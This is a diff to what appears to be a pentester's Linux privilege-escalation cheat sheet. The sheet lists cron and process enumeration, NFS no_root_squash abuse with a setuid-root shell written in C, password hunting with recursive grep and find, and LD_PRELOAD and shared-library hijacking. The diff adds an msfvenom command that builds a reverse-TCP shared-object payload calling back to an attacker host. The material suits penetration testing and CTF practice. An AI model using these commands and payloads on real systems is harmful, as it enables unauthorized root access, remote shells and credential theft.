@@ -48,21 +48,18 @@ functions:
         - [ ] cat  /var/spool/cron/*
         - [ ] systemctl list-timers --all
         - [ ] grep "CRON" /var/log/cron.log
-          https://cronitor.io/cron-reference/how-to-list-all-cron-jobs
-
         - [ ] Is CRON running but you can't tell what??  process monitoring (below scripts)
               nohup bash ./procmon.sh > procs.txt &
               cat procs.txt
-          https://github.com/unkn0wnsyst3m/scripts/blob/master/procmon.sh
-          (CHOICE #1) https://github.com/DominicBreuker/pspy
-            nohup ./pspy64 -p -i 1000 > out &
+              https://github.com/unkn0wnsyst3m/scripts/blob/master/procmon.sh
+              https://github.com/DominicBreuker/pspy   nohup ./pspy64 -p -i 1000 > out &
+              https://cronitor.io/cron-reference/how-to-list-all-cron-jobs
 
         File Systems #NoRootSquash
         - [ ] cat /etc/exports | grep no_root_squash
               showmount -e <targetip>  #mount -o rw,vers=2 <targetip>:<mountable-folder> <localmount>
               echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > shell.c
-              gcc shell.c -o shell
-              chmod +s+x shell
+              gcc shell.c -o shell; chmod +s+x shell --> add to share
 
         Password Hunting:
         - [ ] grep --color=auto -rnw '/' -ie "PASSWORD=" 2>/dev/null
@@ -72,12 +69,19 @@ functions:
         - [ ] find / -iname *passw* 2>/dev/null
         - [ ] find / -iname *passw* 2>/dev/null | grep -v -E "/lib/systemd/|boot|/var/lib/dpkg/|/usr/share/|/usr/lib/"
 
-        LD_PRELOAD:
+        (Shared Library) LD_PRELOAD:
         - [ ] sudo -l  #--> is LD_PRELOAD in the sudo permissions?
           https://github.com/unkn0wnsyst3m/scripts/blob/master/shell_ldpreload.c
           gcc -fPIC -shared shell.c -o shell.so -nostartfiles
-
+          msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=kali
+          
           sudo LD_PRELOAD=/home/user/shell.so <BIN IN SUDO -l>
+
+        (Shared Library) Hijack:
+        - [ ] ls -al /etc/ld.so.conf.d/
+        - [ ] ldd $(find / -perm -u=s -type f 2>/dev/null)  #look for paths you can edit and look for unlinked libraries
+        - [ ] echo $LD_LIBRARY_PATH
+              https://www.boiteaklou.fr/Abusing-Shared-Libraries.html
 
         SUID:
         - [ ] find / -perm -u=s -type f -ls 2>/dev/null
